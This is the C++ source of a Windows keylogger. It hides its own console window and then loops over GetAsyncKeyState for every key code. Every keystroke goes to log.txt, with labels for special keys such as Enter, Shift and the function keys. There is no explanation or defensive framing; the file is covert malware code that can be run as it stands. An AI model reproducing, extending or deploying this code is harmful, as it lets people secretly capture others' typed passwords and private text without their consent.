#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void WinLogging();
void LinLogging();

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); //Hide command prompt
    WinLogging();
}

void WinLogging() {
    while (true) {   
        for (char c = 0; c <= 254; c++) {
            if (GetAsyncKeyState(c) & 0x1) { // comparing last bit from both using AND
                ofstream log;
                log.open("log.txt", ios::app); // exporting o/p to log.txt

                switch (c) { // for non-alphanumeric keys
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                     
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                        break;
                    case VK_ESCAPE:
                        log << "[esc]";
                        break;
                    case VK_SPACE:
                        log << "[space]";
                        break;
                    
                    case VK_PRIOR:
                        log << "[PgUp]";
                        break;
                    case VK_NEXT:
                        log << "[PgDn]";
                        break;
                    case VK_END:
                        log << "[end]";
                        break;
                    case VK_HOME:
                        log << "[home]";
                        break;
                    case VK_INSERT:
                        log << "[ins]";
                        break;
                    case VK_DELETE:
                        log << "[del]";
                        break;
                    case VK_SNAPSHOT:
                        log << "[PrtScr]";
                        break;
                    case VK_SCROLL:
                        log << "[ScrLck]";
                        break;
                    
                    case VK_UP:
                        log << "[UpArrow]";
                        break;
                    case VK_DOWN:
                        log << "[DnArrow]";
                        break;
                    case VK_LEFT:
                        log << "[LtArrow]";
                        break;
                    case VK_RIGHT:
                        log << "[RtArrow]";
                        break;

                    case VK_NUMLOCK:
                        log << "[NumLock]";
                        break;
                    
                    case VK_F1:
                        log << "[F1]";
                        break;
                    case VK_F2:
                        log << "[F2]";
                        break;
                    case VK_F3:
                        log << "[F3]";
                        break;
                    case VK_F4:
                        log << "[F4]";
                        break;
                    case VK_F5:
                        log << "[F5]";
                        break;
                    case VK_F6:
                        log << "[F6]";
                        break;
                    case VK_F7:
                        log << "[F7]";
                        break;
                    case VK_F8:
                        log << "[F8]";
                        break;
                    case VK_F9:
                        log << "[F9]";
                        break;
                    case VK_F10:
                        log << "[F10]";
                        break;
                    case VK_F11:
                        log << "[F11]";
                        break;     
                    case VK_F12:
                        log << "[F12]";
                        break;
                          
                    case VK_LBUTTON:
                        log << "[LB]";
                        break;
                    case VK_RBUTTON:
                        log << "[RB]";
                        break;
                    
                    default:
                        log << c;
                }

                log.close();
            }
        }
    }
}